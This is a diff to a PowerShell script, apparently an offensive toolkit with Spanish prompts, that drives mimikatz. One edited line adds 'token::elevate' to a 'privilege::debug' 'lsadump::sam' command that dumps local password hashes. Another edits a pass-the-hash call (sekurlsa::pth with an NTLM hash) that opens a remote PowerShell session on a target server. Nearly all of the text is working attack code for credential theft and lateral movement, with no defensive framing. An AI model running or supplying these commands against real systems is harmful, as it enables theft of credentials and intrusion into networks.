@@ -92,7 +92,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
 	$Host.UI.RawUI.ForegroundColor = 'Yellow'
-	powershell $mimipath\mimikatz.exe "privilege::debug" "lsadump::sam" 
+	powershell $mimipath\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" 
         $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Write-Host ""}
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
@@ -150,7 +150,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
       } until ($input -in '1','2','3','4')
 
 Write-Host ""
-if(Test-Path variable:global:PassTheHash) { powershell $mimipath\mimikatz.exe sekurlsa::pth /user:$user /ntlm:$ntlmpass /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" }
+if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe sekurlsa::pth /user:$user /ntlm:$ntlmpass /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" }
 else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
